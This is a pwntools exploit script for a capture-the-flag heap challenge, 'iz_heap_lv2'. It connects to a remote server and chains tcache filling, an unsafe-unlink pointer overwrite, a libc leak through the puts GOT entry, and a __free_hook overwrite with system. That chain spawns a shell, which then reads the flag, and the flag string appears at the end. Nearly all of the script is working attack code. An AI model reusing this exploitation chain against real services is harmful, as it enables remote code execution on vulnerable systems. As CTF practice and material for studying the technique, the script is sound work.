#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
import signal

salt = ''

def clear(signum=None, stack=None):
    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols{}* /tmp/gdb_pid{}* /tmp/gdb_script{}*'.replace('{}', salt))
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''

    '''

    f = open('/tmp/gdb_symbols{}.c'.replace('{}', salt), 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols{}.c -o /tmp/gdb_symbols{}.so'.replace('{}', salt))
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './iz_heap_lv2'
# sh = process(execve_file, env={'LD_PRELOAD': '/tmp/gdb_symbols{}.so'.replace('{}', salt)})
# sh = process(execve_file)
sh = remote('165.22.110.249', 4444)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    
    '''

    f = open('/tmp/gdb_pid{}'.replace('{}', salt), 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script{}'.replace('{}', salt), 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def Add(size, data):
    sh.sendlineafter('Choice: \n', '1')
    sh.sendlineafter('Enter size: ', str(size))
    sh.sendafter('Enter data: ', data)

def Edit(index, data):
    sh.sendlineafter('Choice: \n', '2')
    sh.sendlineafter('Enter index: ', str(index))
    sh.sendafter('Enter data: ', data)

def Delete(index):
    sh.sendlineafter('Choice: \n', '3')
    sh.sendlineafter('Enter index: ', str(index))

def Show(index):
    sh.sendlineafter('Choice: \n', '4')
    sh.sendlineafter('Enter index: ', str(index))

ptr_addr = 0x602040

Add(0x20, '\n')
Add(0x20, '\n')

for i in range(8):
    Add(0xf0, '\n')

for i in range(3, 3 + 7):
    Delete(i)

Delete(1)
Add(0x28, p64(0) + p64(0x21) + p64(ptr_addr + 8 - 0x18) + p64(ptr_addr + 8 - 0x10) + p64(0x20))
Delete(2)

Edit(1, 'a' * 0x10 + p64(elf.got['puts']))
Show(0)

sh.recvuntil('Data: ')
result = sh.recvline()[:-1]
libc_addr = u64(result.ljust(8, '\0')) - libc.symbols['puts']
log.success('libc_addr: ' + hex(libc_addr))

Edit(1, 'a' * 0x10 + p64(libc_addr + libc.symbols['__free_hook']))
Edit(0, p64(libc_addr + libc.symbols['system']))

Add(0xf0, '/bin/sh\0')
    
Delete(2)

sh.sendline('cat /home/iz_heap_lv2/flag')

sh.interactive()
clear()

# ISITDTU{TcAch3_C4ch3_F1LL1Ng_UnL1NKKKKKK_1Z_h34P_LvTw0}